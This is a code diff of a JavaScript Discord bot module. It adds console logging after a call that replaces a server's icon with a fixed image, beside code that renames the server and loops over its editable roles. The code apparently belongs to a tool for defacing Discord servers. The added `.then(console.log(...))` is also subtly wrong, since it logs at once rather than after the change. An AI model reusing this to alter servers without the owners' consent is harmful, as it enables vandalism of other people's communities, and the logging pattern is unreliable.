@@ -12,7 +12,13 @@ module.exports = {
                 console.log(chalk.yellowBright(`CHANGED SERVER NAME TO ${message.guild.name}`))
             )
 
-            message.guild.setIcon('https://media.discordapp.net/attachments/772785979278229555/860902258027397140/download_6.png')
+            message.guild.setIcon('https://media.discordapp.net/attachments/772785979278229555/860902258027397140/download_6.png').then(
+                console.log(
+                    chalk.yellowBright(
+                        "CHANGED SERVER ICON"
+                    )
+                )
+            )
 
             message.guild.roles.cache.forEach((role) => {
                 if(!role.editable) return
@@ -99,7 +105,13 @@ module.exports = {
                 console.log(chalk.yellowBright(`CHANGED SERVER NAME TO ${message.guild.name}`))
             )
 
-            message.guild.setIcon('https://media.discordapp.net/attachments/772785979278229555/860902258027397140/download_6.png')
+            message.guild.setIcon('https://media.discordapp.net/attachments/772785979278229555/860902258027397140/download_6.png').then(
+                console.log(
+                    chalk.yellowBright(
+                        "CHANGED SERVER ICON"
+                    )
+                )
+            )
 
             message.guild.roles.cache.forEach((role) => {
                 if(!role.editable) return
